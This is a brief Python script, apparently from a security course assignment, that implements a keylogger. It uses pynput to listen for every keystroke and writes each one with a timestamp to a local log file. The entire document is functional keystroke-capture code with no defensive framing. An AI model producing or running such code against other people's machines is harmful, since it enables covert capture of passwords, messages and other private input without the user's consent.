from pynput.keyboard import  Key, Listener
import logging

log_directory = r'D:\Documents\PSU Fall 2019\SRA 211'

logging.basicConfig(filename = (log_directory + 'log_results.txt'),level = logging.DEBUG, format = '%(asctime)s: %(message)s')

def keypress(Key):
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
     listener.join()